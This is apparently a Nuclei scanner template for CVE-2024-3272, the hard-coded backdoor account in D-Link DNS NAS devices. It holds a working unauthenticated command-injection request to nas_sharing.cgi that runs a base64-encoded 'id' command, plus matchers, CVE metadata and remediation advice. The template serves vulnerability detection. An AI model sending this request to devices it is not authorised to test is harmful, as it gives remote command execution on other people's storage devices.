http:
- matchers:
  - type: word
    words:
    - <auth_state>1</auth_state>
  - part: body
    regex:
    - uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=aWQ= HTTP/1.1

    Host: {{Hostname}}


    '
  unsafe: true
id: CVE-2024-3272
info:
  author: ritikchaddha
  classification:
    cpe: cpe:2.3:o:dlink:dns-320l_firmware:-:*:*:*:*:*:*:*
    cve-id: CVE-2024-3272
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-77
    epss-percentile: 0.99911
    epss-score: 0.94168
  description: 'A vulnerability, which was classified as very critical, has been found
    in D-Link DNS-320L, DNS-325, DNS-327L and DNS-340L up to 20240403. This issue
    affects some unknown processing of the file /cgi-bin/nas_sharing.cgi of the component
    HTTP GET Request Handler. The manipulation of the argument user with the input
    messagebus leads to hard-coded credentials.

    '
  impact: 'Attackers can use hardcoded credentials to gain unauthorized access to
    D-Link NAS devices and execute commands.

    '
  metadata:
    fofa-query: app="D_Link-DNS-ShareCenter"
    max-request: 1
    product: dns-320l_firmware
    vendor: dlink
    verified: true
  name: D-Link Network Attached Storage - Backdoor Account
  reference:
  - https://github.com/netsecfish/dlink
  - https://nvd.nist.gov/vuln/detail/cve-2024-3272
  remediation: 'Update D-Link NAS firmware to a version that removes the backdoor
    account.

    '
  severity: critical
  tags: cve,cve2024,dlink,nas,kev,vkev,vuln
